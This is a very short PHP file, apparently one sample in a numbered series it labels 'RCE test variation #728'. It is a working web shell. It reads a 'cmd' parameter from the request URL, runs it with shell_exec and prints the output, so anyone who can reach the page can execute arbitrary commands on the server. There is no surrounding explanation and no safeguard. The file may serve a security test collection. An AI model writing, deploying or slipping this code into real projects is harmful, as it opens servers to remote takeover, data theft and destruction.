<?php
// RCE test variation #728
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>